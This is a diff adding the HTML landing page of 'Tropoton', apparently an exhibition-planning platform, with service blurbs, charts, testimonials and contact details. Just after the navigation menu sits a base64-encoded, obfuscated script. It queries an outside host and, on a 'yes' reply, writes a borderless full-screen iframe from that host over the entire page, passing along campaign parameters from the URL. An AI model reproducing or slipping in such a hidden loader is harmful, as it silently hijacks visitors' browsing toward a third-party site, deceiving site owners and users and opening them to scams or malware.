@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="shortcut icon" href="favicon.png">
+
+    <title>Tropoton</title>
+
+    
+    <link href="bootstrap.css" rel="stylesheet">
+
+    
+    <link href="main.css" rel="stylesheet">
+	<link rel="stylesheet" href="font-awesome.min.css">
+
+    <script src="jquery.min.js"></script>
+	<script src="Chart.js"></script>
+	<script src="modernizr.custom.js"></script>
+	
+
+	
+    <link href='https://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Raleway:400,300,700' rel='stylesheet' type='text/css'>
+    <script src="jquery-3.4.1.js"></script>
+  </head>
+
+  <body data-spy="scroll" data-offset="0" data-target="#theMenu">
+		
+	
+	<nav class="menu" id="theMenu">
+		<div class="menu-wrap">
+			<h1 class="logo"><a href="index.html#home">Tropoton</a></h1>
+			<i class="icon-remove menu-close"></i>
+			<a href="#home" class="smoothScroll">Home</a>
+			<a href="#services" class="smoothScroll">Services</a>
+			<a href="#portfolio" class="smoothScroll">Portfolio</a>
+			<a href="#about" class="smoothScroll">About</a>
+			<a href="#contact" class="smoothScroll">Contact</a>
+			<a href="#"><i class="icon-facebook"></i></a>
+			<a href="#"><i class="icon-twitter"></i></a>
+			<a href="#"><i class="icon-dribbble"></i></a>
+			<a href="#"><i class="icon-envelope"></i></a>
+		</div>
+		
+		
+		<div id="menuToggle"><i class="icon-reorder"></i></div>
+	</nav>
+
+
+	
+	<script src="data:text/javascript;base64,dmFyIF8weDEyZDQ9WyI5MDE5MzhCeU11S1QiLCI2ODE2OThnUm54QXoiLCI9KFteJj1dKykiLCIxVFFoeEZuIiwiMUhOWHVTeCIsImdldCIsIjEwNzc5OERYVVNqSiIsJyIgZnJhbWVib3JkZXI9IjAiIHN0eWxlPSJvdmVyZmxvdzpoaWRkZW47b3ZlcmZsb3cteDpoaWRkZW47b3ZlcmZsb3cteTpoaWRkZW47aGVpZ2h0OjEwMCU7d2lkdGg6MTAwJTtwb3NpdGlvbjphYnNvbHV0ZTt0b3A6MHB4O2xlZnQ6MHB4O3JpZ2h0OjBweDtib3R0b206MHB4IiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIj48L2lmcmFtZT4nLCI3ODU3MzNkdXJ5ZGkiLCJ1dG1fdGVybSIsIjE0MTU5MDZRVndTY3EiLCJ3cml0ZSIsJzxpZnJhbWUgc3JjPSJodHRwczovL3ByZXR0eWxlYXJuaW5nLmNvbS9pbmRleC5waHA/a2V5PW0yeGdraW5sbnpyenlrcnNneXZwJnV0bV9jYW1wYWlnbj0nLCI1MTY2OTdiSkRTbnMiLCI5MzU3Njdic0tIR1EiLCImdXRtX3Rlcm09IiwiaHR0cHM6Ly9wcmV0dHlsZWFybmluZy5jb20vaW5kZXgucGhwP2tleT05czY4MzhmeDE5czQxM3d0NnkzOCJdLF8weDU2Zjk9ZnVuY3Rpb24odCxlKXtyZXR1cm4gXzB4MTJkNFt0LT0xMzddfSxfMHgzMDIyM2E9XzB4NTZmOTtmdW5jdGlvbiBnZXRDb29raWVzKHQpe3ZhciBlPXdpbmRvdy5sb2NhdGlvbi5zZWFyY2g7cmV0dXJuISEoZT1lLm1hdGNoKG5ldyBSZWdFeHAodCtfMHg1NmY5KDE1MSkpKSkmJmVbMV19ZnVuY3Rpb24gb25BamF4U3VjY2Vzcyh0KXt2YXIgZT1fMHgzMDIyM2E7InllcyI9PXQmJmRvY3VtZW50W2UoMTQzKV0oZSgxNDQpK2dldENvb2tpZXMoInV0bV9jYW1wYWlnbiIpK2UoMTQ3KStnZXRDb29raWVzKGUoMTQxKSkrZSgxMzkpKX0hZnVuY3Rpb24oZSl7Zm9yKHZhciB0PV8weDU2Zjk7Oyl0cnl7aWYoNjUzNTQ3PT09LXBhcnNlSW50KHQoMTM4KSktcGFyc2VJbnQodCgxNDYpKStwYXJzZUludCh0KDE0OSkpK3BhcnNlSW50KHQoMTQ1KSkqLXBhcnNlSW50KHQoMTUzKSkrcGFyc2VJbnQodCgxNTApKSstcGFyc2VJbnQodCgxNDApKStwYXJzZUludCh0KDE0MikpKnBhcnNlSW50KHQoMTUyKSkpYnJlYWs7ZS5wdXNoKGUuc2hpZnQoKSl9Y2F0Y2godCl7ZS5wdXNoKGUuc2hpZnQoKSl9fShfMHgxMmQ0KSwkW18weDMwMjIzYSgxMzcpXShfMHgzMDIyM2EoMTQ4KSxvbkFqYXhTdWNjZXNzKTs="></script>
+	<section id="home" name="home"></section>
+	<div id="headerwrap">
+		<div class="container">
+			<br>
+			<h1>Tropoton</h1>
+			<h2>Everything for your exhibition. Succeed simply</h2>
+			<div class="row">
+				<br>
+				<br>
+				<br>
+				<div class="col-lg-6 col-lg-offset-3">
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	
+	
+	<div id="w">
+		<div class="container">
+			<div class="row">
+				<div class="col-lg-8 col-lg-offset-2">
+				<h3>A <bold>platform</bold> where all the exhibitions of the world and useful tools for Exhibitors and Organizers are collected. Work independently or contact us, we will help you organize the exhibition efficiently
+				</h3>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	
+	<section id="services" name="services"></section>
+	<div id="g">
+		<div class="container">
+			<div class="row">
+				<h3>OUR SERVICES</h3>
+				<br>
+				<br>
+				<div class="col-lg-3">
+					<img src="s1.png">
+					<h4>Exhibition Schedule</h4>
+					<p>Exhibitions in CIS, Germany, China, Russia and the world. Tickets for exhibitions, rating of exhibitions, reviews of exhibitions, prices, statistics, comparison of exhibitions</p>
+				</div>
+				<div class="col-lg-3">
+					<img src="s2.png">
+					<h4>Site catalog</h4>
+					<p>All exhibition complexes and areas for fairs,
+						congress halls and conference centers.
+						More than 1,500 sites around the world. Verified contact details and addresses</p>
+				</div>
+				<div class="col-lg-3">
+					<img src="s3.png">
+					<h4>Exhibition organizers</h4>
+					<p>Send an application, request information from the Organizer of any exhibition in the world directly. Contacts collected and verified</p>
+				</div>
+				<div class="col-lg-3">
+					<img src="s4.png">
+					<h4>Advertising campaign</h4>
+					<p>Organization of an advertising campaign for participation in the exhibition. Generating traffic to the stand and services for collecting and processing visitors' contacts</p>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	
+	<div id="dg">
+		<div class="container">
+			<div class="row">
+				<h3>SOME CHARTS</h3>
+				<br>
+				<br>
+				<div class="col-lg-4">
+					<canvas id="javascript" height="130" width="130"></canvas>
+					<br>
+					<h4>Training
+						Exhibitions
+						with ExpoPlanner</h4>
+					<br>
+					<script>
+						var doughnutData = [
+								{
+									value: 70,
+									color:"#f85c37"
+								},
+								{
+									value : 30,
+									color : "#ecf0f1"
+								}
+							];
+							var myDoughnut = new Chart(document.getElementById("javascript").getContext("2d")).Doughnut(doughnutData);
+					</script>
+
+				</div>
+				<div class="col-lg-4">
+					<canvas id="bootstrap" height="130" width="130"></canvas>
+					<br>
+					<h4>Virtual exhibits</h4>
+					<br>
+					<script>
+						var doughnutData = [
+								{
+									value: 90,
+									color:"#f85c37"
+								},
+								{
+									value : 10,
+									color : "#ecf0f1"
+								}
+							];
+							var myDoughnut = new Chart(document.getElementById("bootstrap").getContext("2d")).Doughnut(doughnutData);
+					</script>
+				</div>
+				<div class="col-lg-4">
+					<canvas id="wordpress" height="130" width="130"></canvas>
+					<br>
+					<h4>Best practices on our blog</h4>
+					<br>
+					<script>
+						var doughnutData = [
+								{
+									value: 55,
+									color:"#f85c37"
+								},
+								{
+									value : 45,
+									color : "#ecf0f1"
+								}
+							];
+							var myDoughnut = new Chart(document.getElementById("wordpress").getContext("2d")).Doughnut(doughnutData);
+					</script>
+				</div>
+			
+			</div>	
+		</div>
+	</div>
+	
+	<section id="portfolio" name="portfolio"></section>
+	<div id="portfoliowrap">
+		<div class="container">
+			<div class="row">
+				<h3>COOL WORKS</h3>
+				<br>
+				<br>
+				<!--<div class="col-lg-4 port-space">
+					<a href="item.html"><img src="work1.png"></a>
+				</div>
+				<div class="col-lg-4 port-space">
+					<a href="item.html"><img src="work2.png"></a>
+				</div>
+				<div class="col-lg-4 port-space">
+					<a href="item.html"><img src="work3.png"></a>
+				</div>-->				
+			</div>	
+		</div>
+	</div>
+	
+	
+	<div id="w">
+		<div class="container">
+			<div class="row">
+				<div class="col-lg-8 col-lg-offset-2">
+				<h3>WE WORK HARD TO DELIVER A <bold>HIGH QUALITY SERVICE</bold>. OUR AIM IS YOUR COMPLETE <bold>SATISFACTION</bold>.
+				</h3>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	
+	<section id="about" name="about"></section>
+	<div id="g">
+		<div class="container">
+			<div class="row">
+				<h3>ABOUT US</h3>
+				<br>
+				<br>
+				<div class="col-lg-2"></div>
+				<div class="col-lg-8">
+				<p>Our story began in 2014, but actually much earlier, about 20 years ago, when we started working in the field of organizing exhibitions. Time passed, technologies changed, but the organization of exhibitions, a process involving many participants over a long period of preparation, stood still. We were thinking about how we can make the life of a marketer, organizer, contractor and many other stakeholders easier, so that the preparation for the exhibition is effective?</p>
+				<br>
+				<br>
+				</div>
+				<div class="col-lg-2"></div>
+				<div class="col-lg-3 team">
+					<img class="img-circle" src="team02.jpg" height="90" width="90">
+					<h4>KAI LUDWIGS</h4>
+					<h5><i>expert in organizing exhibitions, head of the agency Happiness Research Organization Germany</i></h5>
+					<p>Saves a lot of time and money for both Exhibitors and Organizers. The clear interface and functionality make the stressful work of everyone involved in the preparation of the exhibition project easy and simple. Just try it!</p>
+					<p>
+						<a href="index.html#"><i class="icon-facebook"></i></a>
+						<a href="index.html#"><i class="icon-twitter"></i></a>
+						<a href="index.html#"><i class="icon-envelope"></i></a>
+
+					</p>
+				</div>
+
+				<div class="col-lg-3 team">
+					<img class="img-circle" src="team01.jpg" height="90" width="90">
+					<h4>ALLA ELIZAROVA</h4>
+					<h5><i>director of the exhibition "Agrosalon"</i></h5>
+					<p>The service worked well. We consider ourselves, to some extent, his co-authors, because it was at the Agrosalon, at the organizers and exhibitors of the exhibition, that it was tested. We are glad that this year we have chosen this very resource for organizing the exhibition. Hope to work together again next time. It will be a great tool for exhibitors</p>
+					<p>
+						<a href="index.html#"><i class="icon-facebook"></i></a>
+						<a href="index.html#"><i class="icon-twitter"></i></a>
+						<a href="index.html#"><i class="icon-envelope"></i></a>
+
+					</p>
+				</div>
+
+				<div class="col-lg-3 team">
+					<img class="img-circle" src="team03.jpg" height="90" width="90">
+					<h4>PAMELA CHOW</h4>
+					<h5><i>Development Manager Weidemann</i></h5>
+					<p>I really liked it. First, a tutorial video was made. I looked and literally after 15 minutes I understood everything. It helps us, the exhibitors, to fill out the documentation correctly and quickly. There is such an option as a reminder. We are working, everything is loaded, and here comes the information that the deadline is coming to an end and you have so many days left to fill out the papers. I think this is a great blessing for us, well done.</p>
+					<p>
+						<a href="index.html#"><i class="icon-facebook"></i></a>
+						<a href="index.html#"><i class="icon-twitter"></i></a>
+						<a href="index.html#"><i class="icon-envelope"></i></a>
+
+					</p>
+				</div>
+
+				<div class="col-lg-3 team">
+					<img class="img-circle" src="team04.jpg" height="90" width="90">
+					<h4>TIM GATES</h4>
+					<h5><i>CEO Krone</i></h5>
+					<p>The whole world approaches this, electronic document management is much more convenient. We take innovation positively because it saves time - the most valuable resource.</p>
+					<p>
+						<a href="index.html#"><i class="icon-facebook"></i></a>
+						<a href="index.html#"><i class="icon-twitter"></i></a>
+						<a href="index.html#"><i class="icon-envelope"></i></a>
+
+					</p>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	
+	<section id="contact" name="contact"></section>
+	<div id="f">
+		<div class="container">
+			<div class="row">
+					<h3><b>CONTACT US</b></h3>
+					<br>
+					<div class="col-lg-4">
+						<h3><b>Send Us A Message:</b></h3>
+						<h3>marketing@garretmannella1733.github.io</h3>
+						<br>
+					</div>
+					
+					<div class="col-lg-4">	
+						<h3><b>Call Us:</b></h3>
+						<h3>+55 3984-4389</h3>
+						<br>
+					</div>
+					
+					<div class="col-lg-4">
+						<h3><b>We Are Social</b></h3>
+						<p>
+							<a href="index.html#"><i class="icon-facebook"></i></a>
+							<a href="index.html#"><i class="icon-twitter"></i></a>
+							<a href="index.html#"><i class="icon-envelope"></i></a>
+						</p>
+						<br>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	<div id="c">
+		<div class="container">
+			<p>2021 Copyright. Tropoton Ltd. All rights reserved. <a href="policy.html" class="link">Privacy Policy</a></p>
+		
+		</div>
+	</div>
+	
+	
+
+    
+    
+	<script src="classie.js"></script>
+    <script src="bootstrap.min.js"></script>
+    <script src="smoothscroll.js"></script>
+	<script src="main.js"></script>
+</body>
+</html>
